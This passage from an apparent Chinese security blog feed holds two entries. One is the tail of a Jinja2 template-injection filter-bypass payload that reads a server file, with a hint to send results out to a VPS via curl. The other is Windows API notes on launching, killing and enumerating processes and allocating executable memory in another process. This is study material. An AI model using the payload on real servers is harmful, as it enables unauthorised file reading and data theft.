<span class="built_in">set</span> builtins=(a,a,<span class="built_in">dict</span>(builtins=aa)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(x|attr(init)|attr(<span class="built_in">globals</span>)|attr(getitem))(builtins) %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>((four~seven)|<span class="built_in">int</span>)~<span class="built_in">chr</span>((ten~two)|<span class="built_in">int</span>)~<span class="built_in">chr</span>((ten~eight)|<span class="built_in">int</span>)~<span class="built_in">chr</span>((nine~seven)|<span class="built_in">int</span>)~<span class="built_in">chr</span>((ten~three)|<span class="built_in">int</span>) %&#125;</span><br><span class="line">&#123;% <span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read()) %&#125;</span><br></pre></td></tr></table></figure>

<p>最后关于无回显或者是过滤print的执行，可以用curl命令把数据发到vps上。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>Windows API 学习记录</title>
    <url>/2024/03/13/Reverse/Windows%20API%20%E8%BF%9B%E7%A8%8B%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h2 id="进程启动"><a href="#进程启动" class="headerlink" title="进程启动"></a>进程启动</h2><h3 id="WinExec"><a href="#WinExec" class="headerlink" title="WinExec"></a>WinExec</h3><p>函数在<strong>winbase.h</strong>中声明。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">UINT <span class="title">WinExec</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] LPCSTR lpCmdLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uCmdShow</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lpCmdLine：命令行参数</li>
<li>uCmdShow：显示选项，在<strong>winuser.h</strong>中定义，重点关注：<ul>
<li>SW_HIDE：隐藏窗口。</li>
<li>SW_SHOWNORMAL：激活并显示窗口。</li>
<li>SW_SHOW：激活窗口并以当前大小和位置显示窗口。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">WinExec</span>(<span class="string">&quot;calc.exe&quot;</span>, SW_SHOWNORMAL);</span><br><span class="line"><span class="built_in">WinExec</span>(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, SW_HIDE);</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h3 id="ShellExecute"><a href="#ShellExecute" class="headerlink" title="ShellExecute"></a>ShellExecute</h3><p>函数在<strong>shellapi.h</strong>中声明。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HINSTANCE <span class="title">ShellExecuteA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] HWND   hwnd,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpOperation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           LPCSTR lpFile,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpParameters,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR lpDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           INT    nShowCmd</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hwnd：用于显示 UI 或错误消息的父窗口的句柄。如果操作未与窗口关联，则此值可以为<strong>NULL</strong> 。</li>
<li>lpOperation：用于指定要进行的操作。<ul>
<li>edit：启动编辑器并打开文档进行编辑。</li>
<li>explore：寻找lpFile指定的文件夹。</li>
<li>find：从lpDirectory指定的目录开始启动搜索。</li>
<li>open：打开lpFile参数指定的项目。</li>
<li>NULL：默认为open操作。</li>
</ul>
</li>
<li>lpFile：执行指定动词的文件或对象。</li>
<li>lpParameters：指定要传递给应用程序的参数。如果lpFile为文件应为NULL。</li>
<li>nShowCmd：同WinExec中uCmdShow的用法。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ShellExecute(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>, <span class="string">L&quot;notepad.exe&quot;</span>, <span class="string">L&quot;D:\\test.txt&quot;</span>, <span class="literal">NULL</span>, SW_SHOWNORMAL);</span><br><span class="line">ShellExecute(<span class="literal">NULL</span>, <span class="string">L&quot;open&quot;</span>, <span class="string">L&quot;calc&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, SW_SHOW);</span><br></pre></td></tr></table></figure>

<h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreateProcessA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID                lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPCSTR                lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                LPSTARTUPINFOA        lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]               LPPROCESS_INFORMATION lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lpApplicationName：要执行的模块的名称。为NULL则是lpCommandLine中第一个空格分隔的标记。</li>
<li>lpCommandLine：要执行的命令行。</li>
<li>lpProcessAttributes：指向 SECURITY_ATTRIBUTES 结构（确定子进程是否可以继承新进程对象的返回句柄）的指针。可以为NULL。</li>
<li>lpThreadAttributes：基本同lpProcessAttributes。</li>
<li>bInheritHandles：TRUE则调用进程中的每个可继承句柄都由新进程继承。</li>
<li>dwCreationFlags：控制优先级类和进程的创建的标志。</li>
<li>lpEnvironment：指向新进程的环境块的指针。 如果此参数为NULL，则新进程将使用调用进程的环境。</li>
<li>lpCurrentDirectory：进程当前目录的完整路径。如果此参数为 NULL，则新进程将具有与调用进程相同的当前驱动器和目录。</li>
<li>lpStartupInfo：指向 STARTUPINFO 或 STARTUPINFOEX 结构的指针。</li>
<li>lpProcessInformation：指向接收有关新进程的标识信息的 PROCESS_INFORMATION 结构的指针。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    <span class="type">wchar_t</span> cmdLine[] = <span class="string">L&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, cmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进程访问"><a href="#进程访问" class="headerlink" title="进程访问"></a>进程访问</h2><h3 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。打开现有的本地进程对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] BOOL  bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwProcessId</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>dwDesiredAccess：对进程对象的访问。根据进程的安全描述符检查此访问权限。<ul>
<li>PROCESS_ALL_ACCESS：进程对象的所有可能的访问权限。</li>
<li>PROCESS_SUSPEND_RESUME：暂停或恢复进程所必需的。</li>
<li>PROCESS_VM_OPERATION：需要对进程的地址空间执行操作。</li>
<li>PROCESS_VM_READ：使用 ReadProcessMemory 读取进程中的内存所必需的。</li>
<li>PROCESS_VM_WRITE：使用 WriteProcessMemory 写入进程中的内存。</li>
<li>PROCESS_TERMINATE：使用 TerminateProcess 终止进程所必需的。</li>
</ul>
</li>
<li>bInheritHandle：如果该值为 TRUE，则该进程创建的进程将继承该句柄。</li>
<li>dwProcessId：要打开的本地进程的标识符。</li>
</ul>
<p>如果函数失败，则返回值为 NULL。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HANDLE handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">true</span>, <span class="number">29084</span>);</span><br></pre></td></tr></table></figure>

<h3 id="TerminateProcess"><a href="#TerminateProcess" class="headerlink" title="TerminateProcess"></a>TerminateProcess</h3><p>函数在<strong>processthreadsapi.h</strong>中声明。终止指定的进程及其所有线程。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">TerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] UINT   uExitCode</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hProcess：要终止的进程句柄。句柄必须具有 PROCESS_TERMINATE 访问权限。 </li>
<li>uExitCode：进程和线程将使用的退出代码，由于此调用而终止。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE handle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="literal">true</span>, <span class="number">32496</span>);</span><br><span class="line">    <span class="keyword">if</span> (handle != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">TerminateProcess</span>(handle, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><h3 id="CreateToolhelp32Snapshot"><a href="#CreateToolhelp32Snapshot" class="headerlink" title="CreateToolhelp32Snapshot"></a>CreateToolhelp32Snapshot</h3><p>函数在<strong>tlhelp32.h</strong>中声明。获取指定进程以及这些进程使用的堆、模块和线程的快照。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD th32ProcessID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>dwFlags：要包含在快照中的系统部分。 <ul>
<li>TH32CS_INHERIT：指示快照句柄是可继承的。</li>
<li>TH32CS_SNAPALL：包括系统中的所有进程和线程，以及 th32ProcessID 中指定的进程的堆和模块。</li>
<li>TH32CS_SNAPPROCESS：包括系统中快照中的所有进程。</li>
<li>TH32CS_SNAPTHREAD：包括快照系统中的所有线程。</li>
</ul>
</li>
<li>th32ProcessID：要包含在快照中的进程的进程标识符。此参数可以为零以指示当前进程。</li>
</ul>
<p>如果函数失败，它将返回 <strong>INVALID_HANDLE_VALUE</strong>。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HANDLE handle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Process32First"><a href="#Process32First" class="headerlink" title="Process32First"></a>Process32First</h3><p>函数在<strong>tlhelp32.h</strong>中声明。检索有关系统快照中遇到的第一个进程的信息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Process32First</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]      HANDLE           hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out] LPPROCESSENTRY32 lppe</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hSnapshot：快照的句柄，该句柄是从上次调用 CreateToolhelp32Snapshot 函数返回的。</li>
<li>lppe：指向 PROCESSENTRY32 结构的指针。</li>
</ul>
<p>来看 PROCESSENTRY32 结构：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tagPROCESSENTRY32</span> &#123;</span><br><span class="line">  DWORD     dwSize;                <span class="comment">// 结构大小（以字节为单位）。</span></span><br><span class="line">  DWORD     cntUsage;              <span class="comment">// 此成员不再使用，并且始终设置为零。</span></span><br><span class="line">  DWORD     th32ProcessID;         <span class="comment">// 进程标识符。</span></span><br><span class="line">  ULONG_PTR th32DefaultHeapID;     <span class="comment">// 此成员不再使用，并且始终设置为零。</span></span><br><span class="line">  DWORD     th32ModuleID;          <span class="comment">// 此成员不再使用，并且始终设置为零。</span></span><br><span class="line">  DWORD     cntThreads;            <span class="comment">// 进程启动的执行线程数。</span></span><br><span class="line">  DWORD     th32ParentProcessID;   <span class="comment">// 创建此进程的进程的标识符 (其父进程) 。</span></span><br><span class="line">  LONG      pcPriClassBase;        <span class="comment">// 此进程创建的任何线程的基本优先级。</span></span><br><span class="line">  DWORD     dwFlags;               <span class="comment">// 此成员不再使用，并且始终设置为零。</span></span><br><span class="line">  CHAR      szExeFile[MAX_PATH];   <span class="comment">// 进程的可执行文件的名称。</span></span><br><span class="line">&#125; PROCESSENTRY32;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESSENTRY32 lppe = &#123; <span class="built_in">sizeof</span>(lppe) &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE handle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (handle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">Process32First</span>(handle, &amp;lppe);</span><br><span class="line">        std::wcout &lt;&lt; lppe.szExeFile &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240313101247077.png" alt="image-20240313101247077"></p>
<h3 id="Process32Next"><a href="#Process32Next" class="headerlink" title="Process32Next"></a>Process32Next</h3><p>函数在<strong>tlhelp32.h</strong>中声明。检索有关系统快照中记录的下一个进程的信息。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Process32Next</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE           hSnapshot,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPPROCESSENTRY32 lppe</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>参数同 Processes2First 相同。尝试遍历进程：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PROCESSENTRY32 lppe = &#123; <span class="built_in">sizeof</span>(lppe) &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE handle = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPALL, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (handle != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        BOOL ret = <span class="built_in">Process32First</span>(handle, &amp;lppe);</span><br><span class="line">        <span class="keyword">while</span> (ret) &#123;</span><br><span class="line">            std::wcout &lt;&lt; lppe.szExeFile &lt;&lt; <span class="string">L&quot; : &quot;</span> &lt;&lt; lppe.th32ProcessID &lt;&lt; std::endl;</span><br><span class="line">            ret = <span class="built_in">Process32Next</span>(handle, &amp;lppe);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20240313101928574.png" alt="image-20240313101928574"></p>
<h2 id="内存申请"><a href="#内存申请" class="headerlink" title="内存申请"></a>内存申请</h2><h3 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h3><p>函数在<strong>memoryapi.h</strong>中声明。保留、提交或更改调用进程的虚拟地址空间中页面区域的状态。 此函数分配的内存会自动初始化为零。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>lpAddress：要分配的区域的起始地址。如果此参数为 NULL，则系统会确定分配区域的位置。</li>
<li>dwSize：区域的大小（以字节为单位）。</li>
<li>flAllocationType：内存分配的类型。<ul>
<li>MEM_COMMIT：提交指定的内存区域，分配实际的物理存储。</li>
<li>MEM_RESERVE：保留指定的内存区域，无需分配实际的物理存储。</li>
</ul>
</li>
<li>flProtect：要分配的页区域的内存保护。<ul>
<li>PAGE_NOACCESS：禁用对已提交页面区域的所有访问。</li>
<li>PAGE_EXECUTE：启用对页面已提交区域的执行访问。</li>
<li>PAGE_EXECUTE_READ：启用对页面已提交区域的执行或只读访问。</li>
<li>PAGE_EXECUTE_READWRITE：启用对已提交页面区域的执行、只读或读&#x2F;写访问权限。</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID address = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>, address);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="VirtualAlloc2"><a href="#VirtualAlloc2" class="headerlink" title="VirtualAlloc2"></a>VirtualAlloc2</h3><p>函数在<strong>memoryapi.h</strong>中声明。保留、提交或更改指定进程的虚拟地址空间中内存区域的状态， (分配的内存初始化为零) 。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">VirtualAlloc2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      HANDLE                 Process,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      PVOID                  BaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                SIZE_T                 Size,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  AllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  PageProtection,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] MEM_EXTENDED_PARAMETER *ExtendedParameters,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                ULONG                  ParameterCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Process：进程的句柄。句柄必须具有 <strong>PROCESS_VM_OPERATION</strong> 访问权限。 如果 Process 为 NULL，则该函数为调用进程分配内存。</li>
<li>BaseAddress：为要分配的页面区域指定所需起始地址的指针。如果 BaseAddress 为 NULL，则该函数确定区域分配位置。</li>
<li>ExtendedParameters：指向 MEM_EXTENDED_PARAMETER 类型的一个或多个扩展参数的可选指针。</li>
<li>ParameterCount：ExtendedParameters 指向的扩展参数数。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	<span class="type">wchar_t</span> cmdLine[] = <span class="string">L&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">	BOOL pret = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, cmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (pret) &#123;</span><br><span class="line">		PVOID address = <span class="built_in">VirtualAlloc2</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>, address);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>函数在<strong>memoryapi.h</strong>中声明。在指定进程的虚拟地址空间中保留、提交或更改内存区域的状态。 函数将它分配的内存初始化为零。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Process：进程的句柄。句柄必须具有 <strong>PROCESS_VM_OPERATION</strong> 访问权限。</li>
</ul>
<p>其他参数上述都给出。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(si) &#125;;</span><br><span class="line">	PROCESS_INFORMATION pi;</span><br><span class="line">	<span class="type">wchar_t</span> cmdLine[] = <span class="string">L&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">	BOOL pret = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>, cmdLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">false</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="keyword">if</span> (pret) &#123;</span><br><span class="line">		PVOID address = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0x1000</span>, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>, address);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="HeapAlloc"><a href="#HeapAlloc" class="headerlink" title="HeapAlloc"></a>HeapAlloc</h3><p>函数在<strong>heapapi.h</strong>中声明。从堆中分配内存块。 分配的内存不可移动。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DECLSPEC_ALLOCATOR LPVOID <span class="title">HeapAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] HANDLE hHeap,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD  dwFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T dwBytes</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>hHeap：要从中分配内存的堆的句柄。 此句柄由 HeapCreate 或 GetProcessHeap 函数返回。</li>
<li>dwFlags：堆分配选项。<ul>
<li>HEAP_ZERO_MEMORY：分配的内存将初始化为零。</li>
</ul>
</li>
<li>dwBytes：要分配的字节数。</li>
</ul>
<p>解析相关的 HeapCreate 或 GetProcessHeap 函数。</p>
<p>HeapCreate 函数在<strong>heapapi.h</strong>中声明。创建可由调用进程使用的专用堆对象。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">HeapCreate</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD  flOptions,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T dwInitialSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T dwMaximumSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>flOptions：堆分配选项。 此参数可以是 0 或以下一个或多个值。<ul>
<li>HEAP_GENERATE_EXCEPTIONS：系统将引发异常以指示函数失败。</li>
<li>HEAP_NO_SERIALIZE：序列化访问将不用于此分配。</li>
<li>HEAP_CREATE_ENABLE_EXECUTE：堆分配的所有内存块都允许代码执行。</li>
</ul>
</li>
<li>dwInitialSize：堆的初始大小（以字节为单位）。 </li>
<li>dwMaximumSize：堆的最大大小（以字节为单位）。如果 dwMaximumSize 为 0，堆大小可能会增大。</li>
</ul>
<p>GetProcessHeap 函数在<strong>heapapi.h</strong>中声明。检索调用进程的默认堆的句柄。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">GetProcessHeap</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>接下来是使用 HeapAlloc 函数：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE proheap = <span class="built_in">GetProcessHeap</span>();</span><br><span class="line">	<span class="keyword">if</span> (proheap) &#123;</span><br><span class="line">		PVOID address = <span class="built_in">HeapAlloc</span>(proheap, HEAP_ZERO_MEMORY, <span class="number">0x1000</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;0x%x&quot;</span>, address);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="GlobalAlloc"><a href="#GlobalAlloc" class="headerlink" title="GlobalAlloc"></a>GlobalAlloc</h3><p>函数在<strong>winbase.h</strong>中声明。从堆中分配指定数量的字节。</p>
